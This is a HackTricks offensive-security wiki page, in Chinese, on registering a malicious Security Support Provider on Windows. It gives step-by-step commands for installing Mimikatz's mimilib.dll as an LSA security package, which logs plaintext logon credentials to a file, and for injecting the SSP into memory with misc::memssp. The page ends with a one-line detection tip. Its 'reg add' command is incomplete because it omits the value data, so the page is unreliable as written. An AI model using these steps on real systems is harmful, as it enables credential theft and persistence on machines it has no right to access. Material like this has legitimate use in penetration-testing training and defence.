# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[在这里了解什么是 SSP（Security Support Provider）。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建**自己的 SSP**，以**捕获**用于访问该机器的**明文** **凭据**。

#### Mimilib

你可以使用 Mimikatz 提供的 `mimilib.dll` binary。**它会将所有明文凭据记录到文件中。**\
将该 dll 放入 `C:\Windows\System32\`\
获取现有 LSA Security Packages 的列表：
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
将 `mimilib.dll` 添加到 Security Support Provider 列表（Security Packages）中：
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
重启后，所有凭据都可以在 `C:\Windows\System32\kiwissp.log` 中以明文形式找到。

#### 内存中

你也可以使用 Mimikatz 直接将其注入内存（注意，这可能有些不稳定或无法正常工作）：
```bash
privilege::debug
misc::memssp
```
这不会在重启后保留。

#### 缓解措施

事件 ID 4657 - 审计 `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages` 的创建/更改

{{#include ../../banners/hacktricks-training.md}}
